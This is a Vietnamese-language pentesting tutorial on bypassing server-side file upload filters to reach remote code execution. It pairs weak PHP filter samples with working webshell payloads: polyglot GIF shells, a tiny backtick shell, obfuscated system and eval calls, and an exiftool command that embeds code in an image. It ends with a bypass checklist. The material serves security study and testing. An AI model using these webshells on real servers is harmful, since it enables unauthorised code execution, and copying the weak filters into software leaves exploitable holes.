# Filter và Bypass File Upload

> Tài liệu này tập trung làm rõ bản chất kỹ thuật của các bộ lọc (Filter) bảo mật phía máy chủ và nguyên nhân gốc rễ (Root Cause) giúp kẻ tấn công vượt qua (Bypass) thành công.

## 1. Bản chất của Bộ lọc & Bypass

Trong một ứng dụng Web, chức năng tải tệp lên (File Upload) thường tiềm ẩn nguy cơ cao dẫn đến **Thực thi mã từ xa (RCE)** nếu kẻ tấn công tải được tệp mã kịch bản động (như `.php`, `.jsp`, `.aspx`) vào hệ thống và kích hoạt được nó.

* **Filter (Bộ lọc)**: Các chốt chặn do lập trình viên thiết lập nhằm xác minh tính hợp lệ của tệp tải lên.
* **Bypass (Vượt qua)**: Kẻ tấn công lợi dụng sự **bất đồng bộ (parser confusion)** giữa cách ứng dụng kiểm tra tệp và cách hệ điều hành hoặc máy chủ web xử lý/thực thi tệp sau đó để lưu và chạy webshell thành công.

## 2. Chi tiết các cơ chế lọc và Kỹ thuật Bypass tương ứng

### 2.1. Bộ lọc Phần mở rộng (Extension Filter)

* **Bộ lọc hoạt động thế nào?**: Trích xuất phần đuôi sau dấu chấm cuối cùng của tên tệp và so khớp với Whitelist (Danh sách trắng) hoặc Blacklist (Danh sách đen).
* **Code mẫu (yếu)**:
  ```php
  $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
  if (in_array($ext, ["php", "phtml"])) die("Đuôi file bị cấm!");
  ```
* **Bản chất điểm yếu (Root Cause)**: Sự sai lệch phân tích và chuẩn hóa tên tệp giữa bộ lọc của ứng dụng và thành phần xử lý phía sau (Web Server, Hệ điều hành, Trình dịch).

#### Các trường hợp Bypass cụ thể:

##### 1. Blacklist không đầy đủ
* **Nguyên nhân**: Ứng dụng cấm `.php` nhưng cấu hình Web Server hoặc PHP Engine lại được cài đặt để thực thi cả các đuôi mở rộng khác.
* **Flow hoạt động**:
  ```text
  Tên file: shell.phtml ──► [Ứng dụng (không bị cấm)] ──► [Lưu đĩa] ──► [PHP Engine thực thi]
  ```
* **Cách bypass**: Sử dụng các đuôi mở rộng thay thế như: `.phtml`, `.php5`, `.phar`, `.phps`, `.pht`, hoặc đổi hoa thường như `.pHp`, `.PhP` (nếu cấu hình server không phân biệt case).
* **Điều kiện thành công**: Cấu hình Web Server cho phép chạy PHP trên các đuôi này.

##### 2. Parser Confusion (Sai lệch phân tích giữa Application & Web Server)
* **Nguyên nhân**: Ứng dụng chỉ kiểm tra phần đuôi cuối cùng của tệp, trong khi Web Server cấu hình xử lý đa phần mở rộng (Multi-Extension) quét từ phải qua trái để tìm Handler tương thích.
* **Flow hoạt động**:
  ```text
  Tên file: shell.php.jpg ──► [Ứng dụng: đuôi .jpg (OK)] ──► [Apache: phát hiện .php ở giữa] ──► [Thực thi PHP]
  ```
* **Cách bypass**: Đặt tên tệp là `shell.php.jpg`.
* **Điều kiện thành công**: Web Server (như Apache) cấu hình lỏng lẻo (sử dụng chỉ thị `AddHandler` hoặc `AddType` cho đuôi `.php`).

##### 3. OS Normalization (Chuẩn hóa hệ điều hành)
* **Nguyên nhân**: Ứng dụng cho phép tải lên tên tệp chứa ký tự thừa ở cuối, nhưng hệ điều hành (Windows) tự động chuẩn hóa tên tệp bằng cách bỏ các dấu chấm và khoảng trắng thừa trước khi ghi vào đĩa.
* **Flow hoạt động**:
  ```text
  Tên file: shell.php. ──► [Ứng dụng: đuôi "." (OK)] ──► [Windows OS: tự xóa "."] ──► [Lưu thành: shell.php]
  ```
* **Cách bypass**: Tải lên tên tệp chứa dấu chấm hoặc khoảng trắng cuối: `shell.php.` hoặc `shell.php `.
* **Điều kiện thành công**: Máy chủ chạy trên hệ điều hành Windows.

##### 4. String Processing (Cắt chuỗi bằng Null Byte)
* **Nguyên nhân**: Ứng dụng xử lý chuỗi dựa trên độ dài (length-aware), nhưng hàm ghi tệp của hệ thống ở tầng dưới (thường viết bằng C) sử dụng ký tự Null (`\x00`) làm điểm kết thúc chuỗi.
* **Flow hoạt động**:
  ```text
  Tên file: shell.php%00.jpg ──► [Ứng dụng: đuôi .jpg (OK)] ──► [Hàm C: dừng đọc tại %00] ──► [Lưu thành: shell.php]
  ```
* **Cách bypass**: Chèn byte hex `00` vào giữa tên tệp: `shell.php%00.jpg` (hoặc trực tiếp qua Hex editor của Burp Suite).
* **Điều kiện thành công**: Phiên bản PHP cũ (< 5.3.4) bị lỗi Null Byte Injection.

##### 5. Windows Filesystem (Alternate Data Streams)
* **Nguyên nhân**: Hệ thống tệp NTFS của Windows hỗ trợ lưu trữ nhiều luồng dữ liệu (Alternate Data Streams - ADS). Khi ghi đè luồng dữ liệu chính của tệp, Windows tự động bỏ qua phần hậu tố đặc biệt.
* **Flow hoạt động**:
  ```text
  Tên file: shell.php::$DATA ──► [Ứng dụng: đuôi ::$DATA (OK)] ──► [Windows NTFS: ghi vào file chính] ──► [Lưu thành: shell.php]
  ```
* **Cách bypass**: Đặt tên tệp là `shell.php::$DATA`.
* **Điều kiện thành công**: Máy chủ chạy hệ điều hành Windows và sử dụng phân vùng NTFS.

### 2.2. Bộ lọc Kiểu nội dung (MIME/Content-Type Filter)

* **Bộ lọc hoạt động thế nào?**: Đọc giá trị tiêu đề `Content-Type` được gửi kèm trong phần body của HTTP POST request.
* **Code mẫu (yếu)**:
  ```php
  if ($_FILES['file']['type'] !== "image/png") die("Chỉ cho phép PNG!");
  ```
* **Bản chất điểm yếu (Root Cause)**: Server hoàn toàn tin tưởng vào dữ liệu khai báo tự do từ phía Client mà không tự kiểm tra cấu trúc file thực tế.
* **Flow hoạt động**:
  ```text
  Client gửi: Content-Type: image/png ──► [Server đọc $_FILES['file']['type']] ──► [So khớp: Hợp lệ] ──► [Cho phép tải lên]
  ```
* **Cách bypass**: Sử dụng Burp Suite bắt request và đổi giá trị tiêu đề `Content-Type: application/x-php` thành `Content-Type: image/png` hoặc `image/jpeg`.
* **Điều kiện thành công**: Ứng dụng chỉ sử dụng duy nhất trường dữ liệu `type` của request để xác thực định dạng file.

### 2.3. Bộ lọc Chữ ký tệp (Magic Bytes / File Signature Filter)

* **Bộ lọc hoạt động thế nào?**: Đọc trực tiếp một số byte đầu tiên (Magic Bytes) của tệp tải lên để đối chiếu với chữ ký định dạng chuẩn (ví dụ: PNG bắt đầu bằng `89 50 4E 47`, GIF bằng `47 49 46 38`).
* **Code mẫu (yếu)**:
  ```php
  $bytes = fread(fopen($_FILES['file']['tmp_name'], 'r'), 4);
  if (bin2hex($bytes) !== "47494638") die("Không phải file GIF!");
  ```
* **Bản chất điểm yếu (Root Cause)**: Bộ lọc của ứng dụng chỉ kiểm tra phần đầu của tệp, trong khi PHP Engine (hoặc trình biên dịch) lại quét toàn bộ tệp để tìm cặp thẻ mở `<?php` và thực thi bất kể dữ liệu nhị phân đứng trước nó.
* **Flow hoạt động**:
  ```text
  [Đầu file: GIF89a;] ──► [Bộ lọc: GIF chuẩn (OK)] ──► [PHP Engine: Quét thấy <?php] ──► [Thực thi webshell]
  ```
* **Cách bypass**: Tạo một tệp hỗn hợp (Polyglot) bằng cách chèn chữ ký ảnh hợp lệ lên đầu tệp webshell:
  ```php
  GIF89a;
  <?php system($_GET['cmd']); ?>
  ```
* **Điều kiện thành công**: PHP Engine được cấu hình thực thi tệp tin này khi được truy cập.

### 2.4. Bộ lọc Nội dung file (File Content Filter / Obfuscation)

* **Bộ lọc hoạt động thế nào?**: Quét nội dung tệp để phát hiện các mẫu ký tự nguy hiểm (Badwords/Regex) hoặc sử dụng thư viện (như `getimagesize()`) để xác minh tính toàn vẹn cấu trúc ảnh.
* **Code mẫu (yếu)**:
  ```php
  if (preg_match('/(php|system|eval)/i', file_get_contents($file))) die("Mã độc!");
  ```
* **Bản chất điểm yếu (Root Cause)**: Bộ quét tĩnh của ứng dụng chỉ tìm kiếm các từ khóa cố định, trong khi ngôn ngữ lập trình cho phép viết mã linh hoạt và làm rối mã (Obfuscation) để đạt cùng mục đích. Các hàm kiểm tra cấu trúc ảnh chỉ xác minh tính hợp lệ của phần đồ họa mà bỏ qua phần metadata.

#### Các kỹ thuật Bypass cụ thể:

##### 1. Sử dụng Short Open Tag
* **Cách làm**: Thay thế `<?php` bằng `<?=` (tương đương `<?php echo ...`) hoặc `<?`.
* **Bypass**: Tránh được việc bộ lọc quét chữ `php` trong thẻ mở.

##### 2. Obfuscation (Làm rối mã độc)
* **Cách làm**: Tránh dùng trực tiếp các hàm nguy hiểm bằng cách gọi hàm động hoặc mã hóa chuỗi.
  * *Gọi hàm động*: 
    ```php
    $a = "sys"."tem"; $a("whoami");
    // Hoặc
    $_GET['a']($_GET['b']); // gọi: ?a=system&b=whoami
    ```
  * *Mã hóa Base64*:
    ```php
    eval(base64_decode("c3lzdGVtKCd3aG9hbWknKTs=")); // system('whoami');
    ```

##### 3. Polyglot (Nhúng mã vào EXIF Metadata của ảnh thực tế)
* **Cách làm**: Nhúng mã webshell vào các trường thông tin ẩn (như Comment, Artist) của một file ảnh thật.
  * Sử dụng công cụ dòng lệnh:
    ```bash
    exiftool -Comment="<?php system($_GET['cmd']); ?>" photo.jpg -o shell.php.jpg
    ```
* **Bypass**: Hàm `getimagesize()` kiểm tra thấy ảnh vẫn đúng cấu trúc chiều cao/chiều rộng nên cho qua. Tuy nhiên, khi tệp được chạy dưới dạng PHP, PHP Engine vẫn quét thấy và thực thi mã ẩn trong metadata.

### 2.5. Bộ lọc Dung lượng tệp (File Size Filter)

* **Bộ lọc hoạt động thế nào?**: Giới hạn kích thước tối đa của tệp tin tải lên.
* **Code mẫu (yếu)**:
  ```php
  if ($_FILES['file']['size'] > 102400) die("File quá lớn!");
  ```
* **Bản chất điểm yếu (Root Cause)**: Webshell chỉ cần dung lượng cực nhỏ để thực hiện đầy đủ chức năng điều khiển.
* **Cách bypass**: Viết webshell tối giản nhất có thể (Tiny Web Shell).
  * Ví dụ webshell 12 bytes chạy command qua dấu backtick:
    ```php
    <?=`$_GET[1]`;
    ```

### 2.6. Bộ lọc Tên file & Đường dẫn (File Name & Path Filter)

* **Bản chất điểm yếu (Root Cause)**: Lọc chuỗi không đệ quy hoặc bỏ sót URL Encoding, dẫn đến lỗ hổng Path Traversal (ghi file ngoài thư mục chỉ định).
* **Bypass & Chi tiết**: Kỹ thuật này có tầm ảnh hưởng lớn, được phân tích chi tiết riêng biệt tại [Task 4.8 - Path Traversal.md](file:///d:/NINHTHANH_CYBERSEC/DOCUMENTATION/TASK%204/Task%204.8%20-%20Path%20Traversal.md).

## 3. Quy trình kiểm thử thực chiến (Bypass Workflow)

Khi kiểm thử chức năng tải tệp, hãy áp dụng quy trình kiểm thử tuần tự dưới đây:

```
[ Bắt đầu kiểm thử ]
       │
       ▼
 1. Tải lên tệp PHP gốc (ví dụ: shell.php)
       │
       ├─► [Thành công] ──► Truy cập trực tiếp URL ──► [Có RCE?] ──► Hoàn thành
       │
       └─► [Thất bại] (Bị chặn)
               │
               ▼
 2. Quan sát HTTP Response để nhận diện bộ lọc (403, 415, 200 kèm thông báo)
               │
               ▼
 3. Thử Bypass theo thứ tự ưu tiên:
       │
       ├──► Bước A: Sử dụng Burp Suite đổi Content-Type (MIME Bypass)
       │
       ├──► Bước B: Thử đổi đuôi file thay thế (.phtml, .phar) hoặc hoa/thường
       │
       ├──► Bước C: Thử đa phần mở rộng hoặc normalizations (shell.php.jpg, shell.php.)
       │
       ├──► Bước D: Thêm chữ ký ảnh Magic Bytes (GIF89a;) lên đầu file shell
       │
       └──► Bước E: Nhúng mã độc vào ảnh thật bằng exiftool (Obfuscation)
               │
               ▼
 4. Xác minh lưu trữ và thực thi (Tham chiếu cấu hình Web Server tại Task 4.4)
```
